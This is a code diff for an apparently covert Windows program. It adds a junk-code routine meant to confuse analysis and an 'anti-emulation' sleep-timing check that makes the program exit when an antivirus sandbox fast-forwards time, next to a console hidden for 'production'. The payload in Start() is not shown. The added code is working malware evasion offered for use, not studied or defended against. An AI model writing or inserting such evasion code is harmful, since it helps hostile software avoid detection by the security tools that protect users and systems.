@@ -104,9 +104,28 @@ void Start() {
     }
 }
 
+// Junk Code Generator
+void Junk() {
+    int a = 0;
+    for (int i = 0; i < 50000; i++) {
+        a += i * 2;
+        a ^= i;
+        if (a % 2 == 0) a = a >> 1;
+    }
+}
+
 int main() {
     // Hidden console for production, can show for debug
     // AllocConsole(); freopen("CONOUT$", "w", stdout);
+    
+    // Anti-Emulation: Sleep
+    // AV sandboxes usually skip long sleeps. We check if time actually passed.
+    DWORD t1 = GetTickCount();
+    Sleep(2000); // 2 seconds
+    DWORD t2 = GetTickCount();
+    if (t2 - t1 < 1500) return 0; // Fast-forwarded? Exit.
+
+    Junk(); // Confusion
     Start();
     return 0;
 }
